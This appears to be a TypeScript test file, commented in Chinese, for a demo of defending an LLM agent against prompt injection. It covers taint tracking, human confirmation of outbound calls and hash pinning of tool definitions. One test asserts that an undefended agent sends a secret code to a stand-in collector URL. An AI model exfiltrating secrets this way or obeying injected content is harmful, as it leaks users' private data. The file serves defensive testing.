import assert from "node:assert/strict";
import { test } from "node:test";

import type Anthropic from "@anthropic-ai/sdk";
import {
  SECRET,
  checkPins,
  demo,
  demoPinning,
  fingerprint,
  inboxHandlers,
  pinTools,
  runAgent,
  script,
  type ToolDef,
} from "./trifecta.ts";
import { FakeAnthropic, text, toolUse } from "../fake_llm/index.ts";

const quiet = { log: () => {} };

test("朴素循环：验证码被拼进 URL 发出去", async () => {
  const [r, outbox] = await demo(false);
  assert.deepEqual(outbox, [`https://collector.example/c?code=${SECRET}`]);
  assert.deepEqual(r.blocked, []);
});

test("污点跟踪：读过不可信内容后外发被拦，被拦的调用仍有 tool_result", async () => {
  const [r, outbox] = await demo(true);
  assert.deepEqual(outbox, []);
  assert.deepEqual(r.blocked, ["fetch_url"]);
  assert.match(r.answer, /已被拦下/);
  // 被拦的调用也有 tool_result，并且标成错误：历史保持合法
  const lastResults = r.messages[4].content as Anthropic.ToolResultBlockParam[];
  assert.deepEqual(lastResults.map((b) => b.type), ["tool_result"]);
  assert.equal(lastResults[0].is_error, true);
  const calls = r.messages[3].content as Anthropic.ContentBlock[];
  const lastCall = calls.at(-1)!;
  assert.equal(lastCall.type === "tool_use" && lastCall.id, lastResults[0].tool_use_id);
});

test("还没读不可信内容时，外发照常放行", async () => {
  const outbox: string[] = [];
  const client = new FakeAnthropic([toolUse("send_message", { to: "alice", text: "我晚点到" }), text("发了")]);
  const r = await runAgent(client, "告诉 alice 我晚点到", inboxHandlers(outbox), { ...quiet, guard: true });
  assert.deepEqual(outbox, ["alice: 我晚点到"]);
  assert.deepEqual(r.blocked, []);
});

test("人工确认通过的外发会执行，确认时能看到完整参数", async () => {
  const outbox: string[] = [];
  const seen: Array<[string, unknown]> = [];
  const confirm = (name: string, args: Record<string, unknown>) => {
    seen.push([name, args.url]); // 确认界面要看到完整参数
    return true;
  };
  await runAgent(new FakeAnthropic(script()), "整理收件箱", inboxHandlers(outbox), { ...quiet, guard: true, confirm });
  assert.deepEqual(seen, [["fetch_url", `https://collector.example/c?code=${SECRET}`]]);
  assert.equal(outbox.length, 1);
});

test("工具定义固定：描述被改（rug pull）能发现", () => {
  assert.deepEqual(demoPinning(), ["get_weather"]);
});

test("哈希稳定；schema 变化和新工具都会被标出", () => {
  const tools: ToolDef[] = [{ name: "a", description: "x", input_schema: { type: "object", properties: {} } }];
  const pins = pinTools(tools);
  assert.deepEqual(checkPins(pins, tools), []);
  // schema 改了也算变化；批准时没有的新工具也要拦
  const changedSchema = [{ ...tools[0], input_schema: { type: "object", properties: { p: { type: "string" } } } }];
  assert.deepEqual(checkPins(pins, changedSchema), ["a"]);
  assert.deepEqual(checkPins(pins, [...tools, { ...tools[0], name: "b" }]), ["b"]);
  // 键顺序不影响哈希
  assert.equal(fingerprint(tools[0]), fingerprint({ input_schema: tools[0].input_schema, description: "x", name: "a" }));
});
